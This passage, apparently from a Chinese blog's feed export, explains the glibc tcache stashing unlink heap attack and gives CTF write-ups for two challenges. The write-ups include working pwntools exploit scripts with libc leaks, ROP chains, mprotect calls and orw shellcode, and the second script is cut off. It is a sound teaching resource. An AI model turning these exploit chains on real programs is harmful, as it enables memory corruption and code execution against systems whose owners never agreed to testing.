f8b2f245867c27a8f7b245e7728e0c9860a0b4327e844ef29bbf4ffd9326e2c1d84c5cf352f477950795868d7f098c071ae736a05a79086acf1aa4049e8155b76fd5f560fde55b5df4d420403935a1c70775b3b45b6c60155f97b89f2063037fb799d15211572107d44f98a5b433a3eb222e33472febc113f9a6546e06ada6d8cadca2b9382d3fd2477214b203ba6cd95ff9e601cd3a7acd48531da66dc4e92eaa315e3625cb2c2ee235c9473e49b8bdd466f87d17cb6413fb4ff8c7768a9b8486c7ae14a65c1ed84786ce5b752d9b00677057e868ec58272bb9b38959d9e3e5cf834b1b46e1f57626fbfdbd4bfdbaac952eee1de8d7bc14fb942eed28c60d310080e38a6844a5d987d144974db6cdb27c87caaa89ad8dd4b19052b19b5e14620d553ad1b49f55867869f1b1fdacbc1d17aaf181c9ff58c369e6f768969d27e40616efa48ffa6fa6e026b3eb3289ed24ea170da46c34fc73575c8d08574b3e765f216dd78bdf0791154aca1746561b126c10c232f55ae205d8ff5e121f2372498053bae2a2896fec78f3cd2c4cfdbe706679b49e6eb7496850c5c7e93deb4beba19a2f8f2fbc49263ca5d28a45cbec43c62b34efa478e2a604b323660940618dbdb0fe81a92fda4870f82692087311cc9ccd87a08936f15c95a63425920f2d011c80338c1343ac0ce970e9e1877b7ef225795c982f7ba104da085e7281173ceb6b0ae25948cab528ef02314e377c56146fc09d44918537be5aa408294da3ef6e850a5af93ada8bae296fbbf9347484d721ad1c73f3cec943e78ad5e951f0a6f59a46a25244931b99ac090d7b68962ee9a41ca311939396d88fe41394dc50674ac5723ebf8fa2f395d9c3351e21c1956389ed5a33fb9ecbabcd4bc2b858ab999cfb2bbc8cd83a159c16f122a51da6f98fff22244d3a15c55919f2fb4c1bf096e89790992e39de7fc2c506f16378f1100c0eff889a9685d03257ef59f25f42b93e5eb011dbe70c34da598ec831d38c46ac77d4fee91e5ded3190e873db8dcbe29661195823f81c1f52c0e0350c77bda8c5da7c543b5f4d036164df153f452d6a620c2ff3aa05fceb549f835592b534b708a6e5d6dd86ab91ed025394cf78ae1d6a8788828f3c65c54f1c29428faf3d3f8efccdf4bae6c41c0e0016d9186c727143b4fda4dcede57f5df5620d511b2b43e66edf87696f948fc7ab7a98c64d05d71e6b7dc2deb547958e0e6553c3ae6eb404ef9d9c72567f6f6c6faacacd042059471d5f9da15a3d094713129f3d965f9dacf11d782e7b4de1432d7cfa108a4a5d120de123db3c2ed88a46e07bb5bfdaaf2dbe2faa4166be7266832f83f5c8552aa6bcceff91856f6fe31575e2e674b875211d74d0f66ca2dee68afe9c5d3895b9904deb28e4573a63997304e5e183ca26ced781bb75087facd59d189bf031d371f83d0b17104c3885e8e993d26344d0428e93ff08e515d909b6786c421c3b931f406a07745209632ad9cf920ff7a13cccb93c2bee2d6f8fa08694b3b39a3c08ad15f4e9918c3ec3e761d8c7c46fb366d21c6a45f51506956cb9cbe3a193e8cfcabf66ecc17a64abea2e74625cfc9e806315898eca0a69b4442eef788035bc1b0884fc48a4fe8f3ae5f7b3225261f713d4183e0021413df67669615bbea5a0950f467451639ccc64e1253ae075a8f7ee48c93f8abe6d268998d90d8a302379e6a4fcb1cf7b5e3f83e1cf65507d709ec39d68da9b95276a258ef9b2f0a4f82d647d2819a8e6daf28a3e7633e4cc912995704f6e2c43ceb93998bcf7c5c5502714946db0ddee7284f7c4730e3c69c8ad6046574d5f22a0b90c7afc84d61e829ba37cffee1f2d7b71b929e481e2081060e57f465ae924a2ad96996cbf7cd7c7bba42637318e65cb0b4153e9779a242fbf476d6f861951147f4f365f17890ff2d3ea9aa38d6500cd9c60d51a3560861628b34ff5b430386772a1e879a1738989962767f9eec136757bd91d532591e4ef02fb0e4ae2cd21791f4defc8a28634ff66d303707298d593f68fcd101445566c3116a3bcd1d25b7010e406d88845dcc32cfa2505f63ee229c457abb29bc3a731146a124cd62d86959ed1986efbcc6d9f9182b734e6554ff71a31f150b6b5e1c7fdc101a4f64758ce7a4160209e58583</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>私房菜</category>
      </categories>
      <tags>
        <tag>lab</tag>
        <tag>拟态防御</tag>
      </tags>
  </entry>
  <entry>
    <title>关于tcache stashing unlink attack的学习总结</title>
    <url>/posts/12414989.html</url>
    <content><![CDATA[<h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack"></a>tcache stashing unlink attack</h2><blockquote>
<p>介绍：在2.29的libc版本中，进行了unsorted bin的双向链表完整性检查。因此unsorted bin attack也就失效了，不过在libc2.29的版本中tcache stashing unlink attack却可以达到类似的效果(在一个任意地址写入一个libc地址)。</p>
<span id="more"></span>

<p>原理：在2.29的libc中，如果我们需要的chunk位于了small bin里面，当我们将chunk从small bin拿出来的时候，还会去检查当前small bin链上是否还有剩余堆块，如果有的话并且tcache bin的链上还有空余位置(<strong>tcache bin不能为空</strong>)，就会将剩余的那个堆块给链入到tcache bin中。<strong>而将small bin中的堆块链入到tcache bin中的时候没有进行双向链表完整性的检查，此时攻击那个即将链入tcache bin的堆块的bk指针，即可向任意地址写入一个libc地址。</strong></p>
<p>注意：上述有一个看似矛盾的地方，如果tcache bin不为空并且没有满，才会将small bin里的堆块给链进来，但是tcache bin不为空的话，正常情况下会直接从tcahce bin里取，并非去small bin里找。但是<strong>calloc函数有个特性，它不会从tcache bin里取堆块，因此该攻击必须要利用calloc函数才行</strong>。</p>
<p><strong>适用版本：目前适用于所有带tcache的glibc版本(2.26–2.36)</strong></p>
<p>使用前提：</p>
<ol>
<li>能使用calloc分配堆块</li>
<li>可以控制small bin中的bk指针</li>
<li>small bin中最少要有两个堆块</li>
</ol>
<p>攻击效果：在任意地址写一个Libc地址(main_arena+96)</p>
<p>利用思路：</p>
<ol>
<li>先进行libc地址以及堆地址的泄露(libc地址不是必须的，而堆地址是必须的，因为我们伪造bk指针的时候，不能破坏fd指针，需要获取堆地址，重新还原fd指针)</li>
<li>然后将tcache bin中只留6个堆块<strong>(这样small bin链入tcache bin后，tcache bin就会直接装满，防止程序继续通过我们篡改的bk指针继续往下遍历)</strong></li>
<li>再做出至少两个位于small bin中的chunk(可以通过切割unsorted bin的方式，让剩余部分的堆块进入small bin或者当遍历unsorted bin的时候，会给堆块分类，让其小堆块进入small bin中)</li>
<li>利用溢出或UAF+edit等手段，篡改位于small bin中的倒数第二个堆块的bk指针为我们想要写入main_arena+96的地址 <strong>注意伪造bk的时候一定不能破坏fd指针</strong></li>
<li>最后我们申请一个位于small bin那条链对应size中的chunk，<strong>将small bin中的一个chunk申请出来，而small bin链中的另一个堆块则进入tcache bin，在链入tcache bin的期间触发了tcache stashing unlink attack。</strong></li>
</ol>
</blockquote>
<p>该漏洞处的源码如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">      <span class="comment">//victim就是要脱链的堆块，也就是small bin里的最后一个</span></span><br><span class="line">      <span class="comment">//这个if在判断我们所需要的size的那条small bin链上是否存在堆块，存在的话就把victim给脱链</span></span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<span class="comment">//对small bin的双向链表的完整性做了检查，确保victim-&gt;bk-&gt;fd指向的还是victim</span></span><br><span class="line">    <span class="comment">//如果我们在这里劫持了victim的bk指针，就会导致bck的fd指向的并不是victim，从而触发异常</span></span><br><span class="line">	    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);<span class="comment">//设置下一个（高地址）chunk的prev_inuse位</span></span><br><span class="line">          bin-&gt;bk = bck;<span class="comment">//将victim脱链</span></span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">	  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">	     stash them in the tcache.  */</span></span><br><span class="line">	  <span class="type">size_t</span> tc_idx = csize2tidx (nb);<span class="comment">//获取size对应的tcache索引</span></span><br><span class="line">	  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<span class="comment">//如果这个索引在tcache bin的范围里，也就是这个size属于tcache bin的范围</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<span class="comment">//如果tcache bin没有满</span></span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)<span class="comment">//如果small bin不为空,tc_victim为small bin中的最后一个堆块</span></span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      bck = tc_victim-&gt;bk;<span class="comment">//这里取tc_victim的bk指针，并没有针对bck做双向链表完整性检查，因此我们可以去攻击tc_victim的bk指针</span></span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">		      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;<span class="comment">//将tc_victim从small bin中脱链</span></span><br><span class="line">		      bck-&gt;fd = bin;<span class="comment">//如果我们伪造bck，这里就可以将bck-&gt;fd的位置写入一个bin的地址(main_arena+96)</span></span><br><span class="line">		      tcache_put (tc_victim, tc_idx);<span class="comment">//将tc_victim链入tc_idx这条链</span></span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>





<h2 id="相关题目"><a href="#相关题目" class="headerlink" title="相关题目"></a>相关题目</h2><h3 id="buu-2020-新春红包题-3"><a href="#buu-2020-新春红包题-3" class="headerlink" title="buu[2020 新春红包题]3"></a>buu[2020 新春红包题]3</h3><h4 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h4><p><img src="/../img/image-20221022100112620.png" alt="image-20221022100112620"></p>
<p><img src="/../img/image-20221022100136657.png" alt="image-20221022100136657"></p>
<h4 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p><img src="/../img/image-20221022100147699.png" alt="image-20221022100147699"></p>
<p>存在一个UAF漏洞</p>
<p>存在一个可以溢出的函数(如下)</p>
<p><img src="/../img/image-20221022100158891.png" alt="image-20221022100158891"></p>
<p>这里可以直接溢出buf打一个栈迁移，迁移到堆上(提前布置一个rop链)，执行orw来绕过沙箱。</p>
<h4 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h4><p>虽然有UAF漏洞并且有edit函数和show函数，但这题没法打tcache poisoning，因为这题申请内存的函数是calloc，这个函数的特性是不从tcache bin中取堆块，因此我们打tcache poisoning也无法从tcache bin链上取出来堆块。而且就算能取出来堆块，也无法绕过沙箱。想绕沙箱就必须去利用那个溢出函数。</p>
<p>溢出函数中存在一个if检查，这里本来用unsorted bin attack的话是很好过检查的，但是在Libc为2.29的版本中对unsorted bin增加了检验双向链表完整性，无法去利用unsorted bin attack 了。不过在2.29有一种手法可以代替unsorted bin attack达到类似的效果，也就是tcache stashing unlink attack(上文对tcache stashing unlink attack做了介绍，这里就不再赘述了)</p>
<h4 id="泄露地址："><a href="#泄露地址：" class="headerlink" title="泄露地址："></a>泄露地址：</h4><p>因为存在UAF漏洞，配合show函数，可以轻松的泄露堆地址和libc地址。但是为了后续的利用，我们前期需要先伪造两条不同的tcache链(一条用于后续small bin中堆块的链入，一条用于让堆块进入unsorted bin，因为0x410这条链装满了，再释放掉0x410的堆块就会直接进入unsorted bin) 如下图，我们执行两次show函数即可获取libc地址和堆地址。</p>
<p><img src="/../img/image-20221022100217107.png" alt="image-20221022100217107"></p>
<h4 id="放入small-bin中两个堆块"><a href="#放入small-bin中两个堆块" class="headerlink" title="放入small bin中两个堆块"></a>放入small bin中两个堆块</h4><p>目前我们在unsorted bin中有一个0x410的堆块，我们先去申请一个0x300的堆块，这样剩下的0x100就会进入unsorted bin中，然后下一次申请0x400的堆块，ptmalloc就会去遍历unsorted bin将原先0x100的堆块放入small bin中。接着如法炮制再申请一个0x400的堆块，释放掉进入unsorted bin，然后申请0x300堆块，将unsorted bin中的堆块进行切割，残留的0x100堆块返回unsorted bin,最后再申请一个不等于0x100的堆块(如果正好相等的话，就直接从unsorted bin里拿出来了，只有不相等才会去遍历，然后给chunk分类)，这时候就又把0x100的堆块放入到了small bin里，而此时small bin中就有两个堆块了。</p>
<h4 id="篡改small-bin中的bk指针"><a href="#篡改small-bin中的bk指针" class="headerlink" title="篡改small bin中的bk指针"></a>篡改small bin中的bk指针</h4><p>因为这道题要触发后门的话，就得让下面这个if成立，我们直接篡改small bin的bk指针为这个qword_4058+2048-0x10的值即可</p>
<p><img src="/../img/image-20221022100228422.png" alt="image-20221022100228422"></p>
<p>篡改后small bin的情况如下</p>
<p><img src="/../img/image-20221022100244186.png" alt="image-20221022100244186"></p>
<p>最后再申请一个0xf0的堆块即可触发tcache stashing unlink attack。</p>
<p>完事了利用后门，打一个栈迁移，迁移执行流到堆上，执行提前布置好的rop链执行orw即可。我是直接调用了mprotect函数让堆去变成可读可写可执行，然后直接执行orw的shellcode(这里没有难点，就不再具体阐述了)</p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h4><p><a href="https://zikh26.github.io/posts/ad411136.html">tools-函数库 | ZIKH26’s Blog</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">d_e=<span class="number">0x19A2</span></span><br><span class="line">d_d=<span class="number">0x1991</span></span><br><span class="line">d_a=<span class="number">0x196E</span></span><br><span class="line">d_s=<span class="number">0x19B3</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:25200&quot;</span>)</span><br><span class="line"><span class="comment"># libc=ELF(&quot;/home/zikh/Desktop/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so&quot;)</span></span><br><span class="line"><span class="comment"># p=remote(&quot;node4.buuoj.cn&quot;,25200)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,choice,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your input: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input the red packet idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): &quot;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your input: &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Please input the red packet idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input content: &quot;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your input: &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input the red packet idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your input: &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please input the red packet idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(i,<span class="number">2</span>,<span class="string">&#x27;wow&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">4</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#prevent merge with top chunk</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">leak_heap=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_heap&#x27;</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1e4ca0</span><span class="comment">#recv_libc()-0x1e4ca0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>,<span class="number">4</span>,<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">pop_rdi=libc_base+<span class="number">0x0000000000026542</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x0000000000026f9e</span></span><br><span class="line">pop_rdx=libc_base+<span class="number">0x000000000012bda6</span></span><br><span class="line">rop=p64(pop_rdi)+p64((leak_heap&gt;&gt;<span class="number">12</span>)*<span class="number">0x1000</span>)</span><br><span class="line">rop+=p64(pop_rsi)+p64(<span class="number">0x4000</span>)</span><br><span class="line">rop+=p64(pop_rdx)+p64(<span class="number">7</span>)</span><br><span class="line">rop+=p64(libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]+libc_base)</span><br><span class="line">rop+=p64(leak_heap+<span class="number">0x13b0</span>)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">b&quot;\x48\xC7\xC0\x03\x00\x00\x00\x48\xC7\xC7\x00\x00\x00\x00\x0F\x05\x68\x66\x6C\x61\x67\x54\x5F\x6A\x00\x5E\x6A\x02\x58\x0F\x05\x6A\x00\x5F\x54\x5E\x6A\x50\x5A\x6A\x00\x58\x0F\x05\x6A\x01\x5F\x54\x5E\x6A\x50\x5A\x6A\x01\x58\x0F\x05&quot;</span></span><br><span class="line">rop+=shellcode</span><br><span class="line">add(<span class="number">12</span>,<span class="number">4</span>,rop)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_a,d_e,d_s,d_d,<span class="number">0x143C</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">3</span>,<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">3</span>,<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line"></span><br><span class="line">target_addr=leak_heap-<span class="number">0x2270</span></span><br><span class="line">log_addr(<span class="string">&#x27;target_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">11</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x300</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+p64(leak_heap+<span class="number">0xb20</span>)+p64(target_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">15</span>,<span class="number">2</span>,<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your input: &quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64(leak_heap+<span class="number">0x1370</span>-<span class="number">8</span>)+p64(<span class="number">0x0000000000058373</span>+libc_base)</span><br><span class="line">p.sendafter(<span class="string">&quot;What do you want to say?&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/image-20221022100258683.png" alt="image-20221022100258683"></p>
<h3 id="hitcon-ctf-2019-one-punch"><a href="#hitcon-ctf-2019-one-punch" class="headerlink" title="hitcon_ctf_2019_one_punch"></a>hitcon_ctf_2019_one_punch</h3><h4 id="保护策略：-1"><a href="#保护策略：-1" class="headerlink" title="保护策略："></a>保护策略：</h4><img src="../img/image-20221026213251795.png" alt="image-20221026213251795" style="zoom:50%;" />

<img src="../img/image-20221026213527448.png" alt="image-20221026213527448" style="zoom:50%;" />

<h4 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h4><p>这道题考察的是tcache stashing unlink attack，不过由于本题开了沙箱，所以最后需要用orw获取flag。</p>
<p>程序给了个后门(可以调用malloc，篡改malloc_hook劫持执行流)，不过需要用tcache stashing unlink attack来触发这个后门，利用libc里的一个gadget(add rsp,0x48;ret)将其写到malloc_hook里，直接控制程序执行流。</p>
<p>利用那个gadget能控制执行流的原因是因为程序询问size的时候，输入到栈里的数据太大了。(如下)</p>
<p><img src="/../img/image-20221026220856636.png" alt="image-20221026220856636"></p>
<h4 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26802&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;hero name: &quot;</span>,content*size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">    p.sendlineafter(<span class="string">&quot;hero name: &quot;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">0xC388</span>))</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_chain</span>():</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x400</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        add(<span class="number">0</span>,<span class="number">0x400</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x400</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        add(<span class="number">0</span>,<span class="number">0x100</span>,<span class="string">&#x27;l&#x27;</span>)</span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_addr</span>():</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    libc_base=recv_libc()-<span class="number">0x1e4ca0</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;hero name: &#x27;</span>)</span><br><span class="line">    leak_heap=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_heap&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> libc_base,leak_heap</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_into_smallbin</span>():</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x1</span>,shellcode_store(<span class="string">&#x27;orw_64&#x27;</span>).ljust(<span class="number">0x2f0</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x300</span>,<span class="string">&#x27;d&#x27;</span>)<span class="comment">#first get into small bin</span></span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x400</span>,<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x300</span>,<span class="string">&#x27;f&#x27;</span>)<span class="comment">#prevent merged chunk</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x2f0</span>,<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x300</span>,<span class="string">&#x27;g&#x27;</span>)<span class="comment">#second get into small bin</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tcache_stashing_unlink_attack</span>(<span class="params">leak_heap,libc_base</span>):</span><br><span class="line">    malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    add_rsp_ret=<span class="number">0x000000000008cfd6</span>+libc_base</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x210</span>,<span class="string">&#x27;h&#x27;</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x210</span>,<span class="string">&#x27;i&#x27;</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    payload=<span class="string">b&#x27;o&#x27;</span>*<span class="number">0x2f0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)+p64(leak_heap-<span class="number">0x560</span>)+p64(leak_heap-<span class="number">0x26f0</span>-<span class="number">0x10</span>-<span 